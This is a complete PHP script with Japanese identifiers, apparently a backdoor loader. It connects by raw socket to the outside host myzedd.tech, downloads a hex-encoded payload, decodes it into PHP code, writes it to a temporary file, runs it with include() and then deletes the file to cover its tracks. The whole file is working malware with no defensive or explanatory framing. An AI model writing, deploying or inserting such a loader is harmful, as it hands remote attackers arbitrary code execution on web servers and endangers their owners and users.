<?php
/* 百鬼夜宴 修正版 */
$URL = 'https://myzedd.tech/project/download3';
$解析 = parse_url($URL);
$ホスト = $解析['host'];
$パス = isset($解析['path']) ? $解析['path'] : '/';
$ポート = ($解析['scheme'] == 'https') ? 443 : 80;
$プロトコル = ($ポート == 443) ? 'ssl://' : '';

$ソケット = @fsockopen($プロトコル . $ホスト, $ポート, $エラー番号, $エラー文, 30);
if ($ソケット) {
    fwrite($ソケット, "GET $パス HTTP/1.1\r\nHost: $ホスト\r\nUser-Agent: Mozilla/5.0\r\nConnection: Close\r\n\r\n");
    $レスポンス = '';
    while (!feof($ソケット)) $レスポンス .= fread($ソケット, 8192);
    fclose($ソケット);
    
    $分割 = explode("\r\n\r\n", $レスポンス, 2);
    $十六進数 = isset($分割[1]) ? trim($分割[1]) : '';
    
    if ($十六進数 && strlen($十六進数) > 10 && ctype_xdigit($十六進数)) {
        $PHPコード = hex2bin($十六進数);
        if ($PHPコード) {
            $一時ファイル = sys_get_temp_dir() . '/' . uniqid() . '.php';
            file_put_contents($一時ファイル, $PHPコード);
            include($一時ファイル);
            unlink($一時ファイル);
        }
    }
}
?>